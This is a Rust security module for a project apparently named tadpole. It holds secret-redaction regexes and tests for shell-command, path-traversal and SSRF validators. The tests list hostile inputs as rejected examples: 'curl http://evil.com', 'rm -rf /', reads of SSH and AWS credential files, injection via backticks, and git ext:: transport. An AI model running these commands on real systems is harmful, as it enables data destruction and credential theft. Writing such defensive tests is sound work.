//! @docs ARCHITECTURE:Security
//!
//! ### AI Context Alignment
//! - **Subsystem**: Frontend Utilities / security
//!
//! ### ⚠️ Invariants & Non-Negotiables
//! - `[Structural]` Type-safe state handling and bounded execution without unhandled panics.
//!
//! ### 🔍 Debugging & Observability
//! - **Local Errors**: none
//! - **Telemetry Targets**: none declared
//! - **Witness Tests**: none declared

use crate::error::AppError;
use std::net::IpAddr;
use std::path::{Path, PathBuf};
use unicode_normalization::UnicodeNormalization;

pub use crate::security::command_guard::{parse_command_tokens, validate_shell_command};
pub use crate::security::path_guard::{validate_path, SafePath};
pub use crate::security::ssrf_guard::{validate_public_http_url, ValidatedUrl};

pub fn is_production_env() -> bool {
    std::env::var("TADPOLE_ENV")
        .or_else(|_| std::env::var("NODE_ENV"))
        .map(|v| v.eq_ignore_ascii_case("production"))
        .unwrap_or(false)
}

/// Sanitizes a string to be used as a filename or ID, with length cap and Unicode NFKC normalization.
pub fn sanitize_id(id: &str) -> String {
    id.nfkc()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '-')
        .take(256)
        .collect()
}

/// Redacts sensitive credentials and keys from strings (S-010).
pub fn redact_secrets(input: &str) -> String {
    use once_cell::sync::Lazy;
    use regex::{Regex, RegexSet};

    struct RedactionPattern {
        pattern: &'static str,
        replacement: &'static str,
    }

    static PATTERNS: Lazy<(RegexSet, Vec<(Regex, &'static str)>)> = Lazy::new(|| {
        let rules = vec![
            // 0. Bearer tokens
            RedactionPattern {
                pattern: r"(?i)bearer\s+[a-zA-Z0-9\-\._~+/]+=*",
                replacement: "[REDACTED]",
            },
            // 1. Authorization header value
            RedactionPattern {
                pattern: r"(?i)authorization:\s*[^\s,]+",
                replacement: "[REDACTED]",
            },
            // 2. Generic key-value pairs for credentials
            RedactionPattern {
                pattern: r#"(?i)("?(?:api_key|secret|password|pwd|pass|token|key|credential)"?\s*[:=]\s*)(["']?)(?:\\.|[^"'\s\n])*(["']?)"#,
                replacement: r#"$1$2[REDACTED]$3"#,
            },
            // 3. OpenAI/Anthropic style keys
            RedactionPattern {
                pattern: r"(?i)sk-(?:ant-)?[a-zA-Z0-9]{20,}",
                replacement: "[REDACTED]",
            },
            // 4. Google API keys
            RedactionPattern {
                pattern: r"(?i)AIza[0-9A-Za-z-_]{30,}",
                replacement: "[REDACTED]",
            },
            // 5. GitHub PATs (classic and fine-grained)
            RedactionPattern {
                pattern: r"(?i)(?:ghp|github_pat)_[a-zA-Z0-9_]{30,120}",
                replacement: "[REDACTED]",
            },
            // 6. AWS Access Key IDs
            RedactionPattern {
                pattern: r"(?i)AKIA[0-9A-Z]{16}",
                replacement: "[REDACTED]",
            },
            // 7. Slack tokens
            RedactionPattern {
                pattern: r"(?i)xox[bp]-[a-zA-Z0-9\-]+",
                replacement: "[REDACTED]",
            },
            // 8. JWT tokens
            RedactionPattern {
                pattern: r"(?i)ey[a-zA-Z0-9_-]{10,}\.ey[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}",
                replacement: "[REDACTED]",
            },
            // 9. PEM private keys
            RedactionPattern {
                pattern: r"(?s)-----BEGIN [A-Z ]+ PRIVATE KEY-----.+?-----END [A-Z ]+ PRIVATE KEY-----",
                replacement: "[REDACTED]",
            },
            // 10. Database connection string passwords
            RedactionPattern {
                pattern: r"(?i)([a-zA-Z0-9+.-]+://[a-zA-Z0-9_.-]+:)([^@\s]+)(@[a-zA-Z0-9_.-]+)",
                replacement: r#"$1[REDACTED]$3"#,
            },
            // 11. AWS secret access keys
            RedactionPattern {
                pattern: r"(?i)(aws_secret_access_key\s*[:=]\s*)([a-zA-Z0-9/+=]{40})",
                replacement: r#"$1[REDACTED]"#,
            },
        ];

        let set = RegexSet::new(rules.iter().map(|r| r.pattern))
            .expect("Security patterns must be valid regex.");
        let regexes = rules
            .iter()
            .map(|r| (Regex::new(r.pattern).unwrap(), r.replacement))
            .collect();
        (set, regexes)
    });

    let mut output = std::borrow::Cow::Borrowed(input);
    let (set, regexes) = &*PATTERNS;

    if set.is_match(&output) {
        for (idx, (re, replacement)) in regexes.iter().enumerate() {
            if set.matches(&output).matched(idx) {
                if let std::borrow::Cow::Owned(s) = re.replace_all(&output, *replacement) {
                    output = std::borrow::Cow::Owned(s);
                }
            }
        }
    }
    output.into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::security::path_guard::strip_unc_prefix;

    #[tokio::test]
    async fn test_validate_public_http_url_blocks_internal_targets() {
        assert!(validate_public_http_url("http://127.0.0.1:8000")
            .await
            .is_err());
        assert!(validate_public_http_url("http://localhost:8000")
            .await
            .is_err());
        assert!(validate_public_http_url("http://10.0.0.1/status")
            .await
            .is_err());
        assert!(
            validate_public_http_url("http://10.0.0.1/latest/meta-data")
                .await
                .is_err()
        );
        assert!(validate_public_http_url("file:///etc/passwd")
            .await
            .is_err());
        assert!(validate_public_http_url("https://10.0.0.1/")
            .await
            .is_ok());
    }

    #[test]
    fn test_validate_path_traversal() {
        let base = std::env::temp_dir().join(format!("tadpole-test-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&base).ok();

        let base_canon = std::fs::canonicalize(&base).unwrap();

        assert!(validate_path(&base_canon, "../outside").is_err());
        assert!(validate_path(&base_canon, "user1/../../outside").is_err());

        // Windows device names & Unix device folders
        assert!(validate_path(&base_canon, "con").is_err());
        assert!(validate_path(&base_canon, "PRN.txt").is_err());
        assert!(validate_path(&base_canon, "subdir/aux").is_err());
        assert!(validate_path(&base_canon, "/dev/stdout").is_err());
    }

    proptest::proptest! {
        #![proptest_config(proptest::prelude::ProptestConfig::with_cases(128))]

        #[test]
        fn test_validate_path_strict_descendant_invariant(
            subpath in r"[a-zA-Z0-9_\-\./\\~ ]{1,60}"
        ) {
            let temp_dir = std::env::temp_dir().join(format!("tadpole-prop-{}", uuid::Uuid::new_v4()));
            let _ = std::fs::create_dir_all(&temp_dir);
            if let Ok(base_canon) = std::fs::canonicalize(&temp_dir) {
                let base_stripped = strip_unc_prefix(&base_canon);

                // If validate_path accepts the path, it MUST be a strict descendant of base
                if let Ok(safe_path) = validate_path(&base_canon, &subpath) {
                    let path_stripped = strip_unc_prefix(safe_path.as_path());
                    proptest::prop_assert!(
                        path_stripped.starts_with(&base_stripped),
                        "Path {:?} escaped authorized base {:?}",
                        path_stripped,
                        base_stripped
                    );
                }
            }
            let _ = std::fs::remove_dir_all(&temp_dir);
        }

        #[test]
        fn test_validate_path_traversal_always_rejected(
            depth in 1usize..8,
            suffix in "[a-zA-Z0-9_]{1,16}"
        ) {
            let temp_dir = std::env::temp_dir().join(format!("tadpole-prop-trav-{}", uuid::Uuid::new_v4()));
            let _ = std::fs::create_dir_all(&temp_dir);
            if let Ok(base_canon) = std::fs::canonicalize(&temp_dir) {
                let mut traversal = String::new();
                for _ in 0..depth {
                    traversal.push_str("../");
                }
                traversal.push_str(&suffix);

                // Any path with net traversal escaping base must return Err
                let result = validate_path(&base_canon, &traversal);
                proptest::prop_assert!(
                    result.is_err(),
                    "Escaping traversal path {:?} was unexpectedly accepted",
                    traversal
                );
            }
            let _ = std::fs::remove_dir_all(&temp_dir);
        }
    }

    #[test]
    fn test_validate_shell_zero_trust() {
        // Authorized
        assert!(validate_shell_command("ls -la").is_ok());
        assert!(validate_shell_command("cargo build --release").is_ok());
        assert!(validate_shell_command("npm test").is_ok());

        // Unauthorized Command
        assert!(validate_shell_command("rm -rf .").is_err());
        assert!(validate_shell_command("curl http://evil.com").is_err());

        // Injection Attempts
        assert!(validate_shell_command("ls; rm -rf /").is_err());
        assert!(validate_shell_command("echo $(cat /etc/passwd)").is_err());
        assert!(validate_shell_command("ls `rm -rf /`").is_err());
        assert!(validate_shell_command("cat /etc/passwd > out.txt").is_err());

        // Redirection Comment Bypass Attempt
        assert!(validate_shell_command("cat data/tadpole.db > output.txt # /dev/null").is_err());

        // Wildcard / Globbing Bypass Attempt
        assert!(validate_shell_command("cat data/tad*.db").is_err());

        // git/npm/cargo Dangerous Options/Subcommands
        assert!(validate_shell_command("git -c core.pager=evil diff").is_err());
        assert!(validate_shell_command("npm install package").is_err());
        assert!(validate_shell_command("cargo run").is_err());

        // Dangerous Flags/Paths
        assert!(validate_shell_command("ls /etc/shadow").is_err());
    }

    #[test]
    fn test_validate_shell_injection_bypass_prevention() {
        // Newline command separation (S-001)
        assert!(validate_shell_command("ls\nrm -rf /").is_err());
        assert!(validate_shell_command("ls\rrm -rf /").is_err());
        assert!(validate_shell_command("ls\0rm").is_err());

        // find -exec (S-002)
        assert!(validate_shell_command("find . -exec rm {} +").is_err());
        assert!(validate_shell_command("find . -ok rm {} ;").is_err());

        // node -e / --eval (S-003)
        assert!(validate_shell_command("node -e \"console.log(1)\"").is_err());
        assert!(validate_shell_command("node --eval \"console.log(1)\"").is_err());

        // python -c / -m (S-003)
        assert!(validate_shell_command("python -c \"import os; os.system('ls')\"").is_err());
        assert!(validate_shell_command("python -m http.server").is_err());

        // git transport RCE (S-004)
        assert!(validate_shell_command("git clone ext::sh -c evil").is_err());
    }

    #[test]
    fn test_redact_secrets_extended_patterns() {
        // Anthropic keys
        assert!(redact_secrets("sk-ant-abc12345678901234567890").contains("[REDACTED]"));

        // Slack tokens
        assert!(redact_secrets("xoxb-abc-123").contains("[REDACTED]"));
        assert!(redact_secrets("xoxp-abc-123").contains("[REDACTED]"));

        // JWT
        assert!(redact_secrets("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c").contains("[REDACTED]"));

        // PEM private keys
        let pem =
            "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----";
        assert!(redact_secrets(pem).contains("[REDACTED]"));

        // DB connection strings
        assert!(
            redact_secrets("postgres://user:super_secret_password@localhost:5432/db")
                .contains("[REDACTED]")
        );
        assert!(
            !redact_secrets("postgres://user:super_secret_password@localhost:5432/db")
                .contains("super_secret_password")
        );

        // AWS secret keys
        assert!(
            redact_secrets("aws_secret_access_key=1234567890123456789012345678901234567890")
                .contains("[REDACTED]")
        );
    }

    #[test]
    fn test_redact_secrets_idempotence() {
        let inputs = vec![
            "sk-ant-abc12345678901234567890",
            "xoxb-abc-123",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----",
            "postgres://user:super_secret_password@localhost:5432/db",
            "aws_secret_access_key=1234567890123456789012345678901234567890",
            "some ordinary string with no keys",
        ];
        for input in inputs {
            let once = redact_secrets(input);
            let twice = redact_secrets(&once);
            assert_eq!(once, twice, "Idempotence failed for input: {}", input);
        }
    }

    #[test]
    fn test_redact_secrets_cross_thread_determinism() {
        use std::thread;
        let input = "postgres://user:super_secret_password@localhost:5432/db and sk-ant-abc12345678901234567890";
        let expected = redact_secrets(input);

        let mut handles = Vec::new();
        for _ in 0..10 {
            let inp = input.to_string();
            let exp = expected.clone();
            handles.push(thread::spawn(move || {
                for _ in 0..1000 {
                    assert_eq!(redact_secrets(&inp), exp);
                }
            }));
        }
        for h in handles {
            h.join().unwrap();
        }
    }

    #[test]
    fn test_validate_shell_command_git_transport_bypass() {
        // ssh:// URL transport bypass (SV3-001)
        assert!(validate_shell_command("git clone ssh://user@evil.com/repo.git").is_err());
        // file:// URL bypass (SV3-002)
        assert!(validate_shell_command("git clone file:///etc/passwd /tmp/").is_err());
    }

    #[tokio::test]
    async fn test_ipv4_mapped_ipv6_loopback_and_metadata_blocked() {
        // ::ffff:127.0.0.1 (IPv4-mapped loopback)
        assert!(validate_public_http_url("http://[::ffff:127.0.0.1]/")
            .await
            .is_err());
        // ::ffff:10.0.0.1 (IPv4-mapped cloud metadata)
        assert!(validate_public_http_url("http://[::ffff:10.0.0.1]/")
            .await
            .is_err());
        // 64:ff9b::127.0.0.1 (NAT64 loopback)
        assert!(validate_public_http_url("http://[64:ff9b::127.0.0.1]/")
            .await
            .is_err());
        // 2002:7f00:0001:: (6to4 loopback 127.0.0.1)
        assert!(validate_public_http_url("http://[2002:7f00:0001::]/")
            .await
            .is_err());
    }

    #[test]
    fn test_shell_comment_divergence_blocked() {
        // Injected comment to bypass trailing commands
        assert!(validate_shell_command("echo safe # | rm -rf /").is_err());
        assert!(validate_shell_command("cat data/tadpole.db # /dev/null").is_err());
    }

    #[test]
    fn test_shell_env_var_and_tilde_expansion_blocked() {
        assert!(validate_shell_command("cat $HOME/.ssh/id_rsa").is_err());
        assert!(validate_shell_command("cat ~/.aws/credentials").is_err());
        assert!(validate_shell_command("echo $SECRET").is_err());
        // Allow $null on output redirection only
        assert!(validate_shell_command("echo safe > $null").is_ok());
    }

    #[test]
    fn test_shell_npm_find_git_hardening() {
        assert!(validate_shell_command("npm ci").is_err());
        assert!(validate_shell_command("npm update").is_err());
        assert!(validate_shell_command("npm link").is_err());
        assert!(validate_shell_command("find . -fprint /tmp/leak").is_err());
        assert!(validate_shell_command("find . -fprintf /tmp/leak %p").is_err());
        assert!(validate_shell_command("find . -delete").is_err());
        assert!(validate_shell_command("git diff --ext-diff").is_err());
    }

    #[test]
    fn test_validate_path_null_byte_rejection() {
        let base = std::env::current_dir().unwrap();
        assert!(validate_path(&base, "foo\0bar").is_err());
    }
}
